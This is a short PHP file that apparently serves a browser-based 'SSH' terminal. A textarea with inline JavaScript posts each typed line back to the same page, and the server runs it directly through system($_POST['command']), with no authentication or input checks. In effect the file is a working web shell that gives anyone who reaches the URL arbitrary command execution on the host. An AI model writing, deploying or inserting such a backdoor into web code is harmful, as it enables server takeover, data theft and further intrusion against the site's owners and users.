<?php

class Ssh {
  
    function e()
    {
        $out=0;
        system($_POST['command'],$out);
        return $out;
    }
    function index()
    {
        $textarea= "<textarea id='command' name='command' onkeypress='e(event);' style='height:100%;width:100%;padding:2%;background-color:black;color:green;'></textarea>";
        $textarea.= "
        <script>
              var path =':> ';
              var display = document.getElementsByTagName('textarea')[0];
              display.value = path;
              var stack = path;
              function e(e)
                  {
                      if(e.code!='Enter')return;
                      var command=  display.value.replace(stack,'');
                                              
                      if(command=='clear'||command=='cls')
                      {
                          stack=path; display.value=path;
                          return;
                      }
                      var http=new XMLHttpRequest();
                      http.open('POST', location.href, true);                          
                      var data=new FormData();
                      data.append('command', command);
                      http.addEventListener('load',show,false);
                      http.send(data);

                      function show()
                      {
                          display.value+=http.response+path;
                          stack=display.value;
                          display.focus();
                      }
                  }   
        </script>
        ";
        echo $textarea;
    }
 }
 $var=new Ssh();
 if(isset($_POST['command']))
  $var->e();
 else $var->index();